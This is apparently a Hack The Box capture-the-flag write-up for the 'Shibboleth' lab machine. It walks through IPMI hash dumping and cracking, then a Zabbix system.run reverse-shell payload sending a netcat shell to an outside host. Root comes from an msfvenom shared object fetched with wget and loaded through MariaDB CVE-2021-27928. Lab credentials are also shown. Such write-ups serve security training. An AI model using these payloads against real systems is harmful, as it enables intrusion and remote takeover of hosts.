# Shibboleth

##

![image](https://user-images.githubusercontent.com/56447720/141720731-d84cee05-4d93-4365-8326-5f8c3300ceef.png)

### Nmap Scan

```bash
└─$ nmap -p- -sC -sV shibboleth.htb
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-15 09:37 IST
Nmap scan report for shibboleth.htb (10.129.99.116)
Host is up (0.20s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.41
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: FlexStart Bootstrap Template - Index

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .

```

Hmmm only 1 port is opened, strange, Let's try scanning UDP ports

```bash
└─$ nmap -vvv -T4 -sU shibboleth.htb
Increasing send delay for 10.129.98.77 from 0 to 50 due to 11 out of 17 dropped probes since last increase.
Warning: 10.129.98.77 giving up on port because retransmission cap hit (6).
Increasing send delay for 10.129.98.77 from 200 to 400 due to 11 out of 14 dropped probes since last increase.
Increasing send delay for 10.129.98.77 from 400 to 800 due to 11 out of 11 dropped probes since last increase.
Nmap scan report for shibboleth.htb (10.129.98.77)
Host is up, received echo-reply ttl 63 (0.21s latency).
Scanned at 2021-11-14 00:50:23 EST for 1076s
Not shown: 993 closed ports
Reason: 993 port-unreaches
PORT      STATE         SERVICE  REASON
623/udp   open          asf-rmcp udp-response ttl 63
5555/udp  open|filtered rplay    no-response
8000/udp  open|filtered irdmi    no-response
21167/udp open|filtered unknown  no-response
30718/udp open|filtered unknown  no-response
49175/udp open|filtered unknown  no-response
49350/udp open|filtered unknown  no-response

Read data files from: /usr/bin/../share/nmap
# Nmap done at Sun Nov 14 01:08:19 2021 -- 1 IP address (1 host up) scanned in 1075.67 seconds
```

............and yess there are some udp ports open

### Directory Scanning

```bash
________________________________________________

 :: Method           : GET
 :: URL              : http://zabbix.shibboleth.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirb/big.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

.htaccess               [Status: 403, Size: 286, Words: 20, Lines: 10]
.htpasswd               [Status: 403, Size: 286, Words: 20, Lines: 10]
app                     [Status: 301, Size: 328, Words: 20, Lines: 10]
assets                  [Status: 301, Size: 331, Words: 20, Lines: 10]
audio                   [Status: 301, Size: 330, Words: 20, Lines: 10]
conf                    [Status: 301, Size: 329, Words: 20, Lines: 10]
favicon.ico             [Status: 200, Size: 32988, Words: 13, Lines: 3]
fonts                   [Status: 301, Size: 330, Words: 20, Lines: 10]
include                 [Status: 301, Size: 332, Words: 20, Lines: 10]
js                      [Status: 301, Size: 327, Words: 20, Lines: 10]
local                   [Status: 301, Size: 330, Words: 20, Lines: 10]
locale                  [Status: 301, Size: 331, Words: 20, Lines: 10]
modules                 [Status: 301, Size: 332, Words: 20, Lines: 10]
robots.txt              [Status: 200, Size: 974, Words: 153, Lines: 23]
server-status           [Status: 403, Size: 286, Words: 20, Lines: 10]
vendor                  [Status: 301, Size: 331, Words: 20, Lines: 10]
:: Progress: [20469/20469] :: Job [1/1] :: 328 req/sec :: Duration: [0:01:06] :: Errors: 0 ::
```

After enumerating through these directories I found nothing that was intresting, let's try getting some subdomains

### Subdomain List

```bash
└─$ ffuf -w /usr/share/wordlists/subdomains/subdomain-1million.txt -u http://shibboleth.htb/ -H "Host: FUZZ.shibboleth.htb" -mc 200 

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://shibboleth.htb/
 :: Wordlist         : FUZZ: /usr/share/wordlists/subdomains/subdomain-1million.txt
 :: Header           : Host: FUZZ.shibboleth.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200
________________________________________________

monitor                 [Status: 200, Size: 3686, Words: 192, Lines: 30]
monitoring              [Status: 200, Size: 3686, Words: 192, Lines: 30]
zabbix                  [Status: 200, Size: 3686, Words: 192, Lines: 30]
```

Voila!! we have some subdomains active , let's add them to /etc/hosts

```bash
└─$ sudo nano /etc/hosts
#htb machines
10.129.99.116 shibboleth.htb zabbix.shibboleth.htb monitor.shibboleth.htb monitoring.shibboleth.htb
```

All the three subdomain had a login page ![image](https://user-images.githubusercontent.com/56447720/141722392-9fbebb36-f73a-4238-8b4b-a59ea0642bb0.png)

Hmmmmmm zabbix

> Zabbix is an open-source monitoring software tool for diverse IT components, including networks, servers, virtual machines and cloud services. Zabbix provides monitoring metrics, among others network utilization, CPU load and disk space consumption

## Get login details

So I tried with some Web Attacks to login but none of them worked, The **UDP port 623** will get us some hashes

#### Learn

* The UDP port 623 is vulnerable : https://book.hacktricks.xyz/pentesting/623-udp-ipmi

#### Login creds

* I've used the Metasplot way to get the hashes because it was easy

```bash
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > use auxiliary/scanner/ipmi/ipmi_dumphashes
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set rhosts 10.129.99.116
rhosts => 10.129.99.116
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > set OUTPUT_JOHN_FILE zabbixlogin
OUTPUT_JOHN_FILE => zabbixlogin
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > exploit

[+] 10.129.99.116:623 - IPMI - Hash found: Administrator:97c8d75502010000d824a6d87cc8260b6a7a8ddf0282eadc5ebab7e75f2c8f7ed1a6429124bdf9b3a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:84568da58ac1bb73a12d71bb0ea9d08a470ebd31
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) > cat zabbixlogin
[*] exec: cat zabbixlogin

10.129.99.116 Administrator:$rakp$97c8d75502010000d824a6d87cc8260b6a7a8ddf0282eadc5ebab7e75f2c8f7ed1a6429124bdf9b3a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72$84568da58ac1bb73a12d71bb0ea9d08a470ebd31

```

* John cracked the password

```bash
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt zabbixlogin 
Using default input encoding: UTF-8
Loaded 1 password hash (RAKP, IPMI 2.0 RAKP (RMCP+) [HMAC-SHA1 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ilovepumkinpie1  (10.129.99.116 Administrator)
1g 0:00:00:02 DONE (2021-11-15 10:10) 0.4201g/s 3139Kp/s 3139Kc/s 3139KC/s in_199..iargxe
Use the "--show" option to display all of the cracked passwords reliably
Session completed

└─$ john  zabbixlogin --show 
10.129.99.116 Administrator:ilovepumkinpie1

1 password hash cracked, 0 left
```

* So now we have the creds \[ Administrator : ilovepumkinpie1 ]

### Initial Foothold

* I researched for a bit and found this intresting
  * https://stackoverflow.com/questions/24222086/how-to-run-command-on-zabbix-agents
* After moving around the website I figured out that `add items` was vulnerable

![image](https://user-images.githubusercontent.com/56447720/141724103-0b775ae7-12af-4136-a0fd-b257ce77ba03.png)

* The payload
  * system.run\[rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc 10.10.10.10 9999 >/tmp/f &,nowait]

![image](https://user-images.githubusercontent.com/56447720/141724345-1db0f62e-b04c-44b4-8381-faf76f4510be.png)

* Set up a nc listener and get the shell

```bash
└─$ nc -nvlp 9002
listening on [any] 9002 ...
connect to [10.10.14.47] from (UNKNOWN) [10.129.99.116] 40614
sh: 0: can't access tty; job control turned off
$ whoami     
zabbix
```

* As there were no SSH ports open we don't get any stabalize shell, let's get work with this shell

### Get User flag / escalting user privileges

```bash
# Use the zabbix login creds to get ipmi-svc user

zabbix@shibboleth$ su ipmi-svc
password : ilovepumkinpie1

ipmi-svc@shibboleth$ cat /home/ipmi-svc/user.txt
<--SNIP-->
 
```

## Escalating privileges \[ root ]

#### linpeas.sh

```bash
root        1279  0.0  0.0   2608  1856 ?        S    Nov13   0:00 /bin/sh /usr/bin/mysqld_safe
root        1431  0.7  3.7 1727148 150636 ?      Sl   Nov13   6:13  _ /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --plugin-dir=/usr/lib/x86_64-linux-gnu/mariadb19/plugin --user=root --skip-log-error --pid-file=/run/mysqld/m
ysqld.pid --socket=/var/run/mysqld/mysqld.sock
```

* Hmmm, MySQL is running as root, let's enumerate
* So the DB information was stored in `/etc/zabbix/zabbix_server.conf`

```bash

ipmi-svc@shibboleth:/etc$ cat /etc/zabbix/zabbix_server.conf | grep -C 2 -i "password"
<zabbix/zabbix_server.conf | grep -C 2 -i "password"
DBUser=zabbix

### Option: DBPassword
#	Database password.
#	Comment this line if no password is used.
#
# Mandatory: no
# Default:
DBPassword=bloooarskybluh

```

* Now we have the username and password \[ zabbix : bloooarskybluh ]

#### MySQL enumeration

* As `ipmi-svc` user was not in the sudoers list GTFO bins is not helpful

```bash
ipmi-svc@shibboleth:/etc$ mysql -V
mysql -V
mysql  Ver 15.1 Distrib 10.3.25-MariaDB, for debian-linux-gnu (x86_64) using readline 5.2
```

* So the version is : 10.3.25

![image](https://user-images.githubusercontent.com/56447720/141776051-2b5f54fd-50e6-4a8d-8771-d51f34fa1aa0.png)

* Link : https://www.cvedetails.com/vulnerability-list/vendor\_id-12010/Mariadb.html
* The first CVE has 9.0 score \[ CVE-2021-27928 ]
* Let's get the root

![image](https://user-images.githubusercontent.com/56447720/141776421-4de72d0d-1aca-410f-840f-df8b7926803a.png)

* Link : https://packetstormsecurity.com/files/162177/MariaDB-10.2-Command-Execution.html

#### Final Step

* Create the reverse shell payload
* msfvenom -p linux/x64/shell\_reverse\_tcp LHOST= LPORT= -f elf-so -o root.so
* I've used python http server and wget to download the payload
  * python3 -m http.server 80 \[ Attacker ]
  * wget http://\<your\_ip>/root.so \[ Victim ]
* Setup a nc listener

```bash

# Login with creds we got earlier 
ipmi-svc@shibboleth:~$ mysql -u zabbix -pbloooarskybluh -h localhost -e 'SET GLOBAL wsrep_provider="/tmp/root.so";'
<host -e 'SET GLOBAL wsrep_provider="/tmp/root.so";'
ERROR 2013 (HY000) at line 1: Lost connection to MySQL server during query

```

### Rooted the machine

```bash

└─$ nc -nvlp 4433                    
listening on [any] 4433 ...
connect to [10.10.14.47] from (UNKNOWN) [10.129.99.153] 49958

python3 -c "import pty;pty.spawn('/bin/bash')"
root@shibboleth:/var/lib/mysql#id
uid=0(root) gid=0(root) groups=0(root) 

root@shibboleth:/var/lib/mysql# cat /root/root.txt
<--SNIP-->

```

**Box pwned**

![image](https://user-images.githubusercontent.com/56447720/141778619-c4e8c92d-47cc-46b7-b212-c7c2bf4785e5.png)
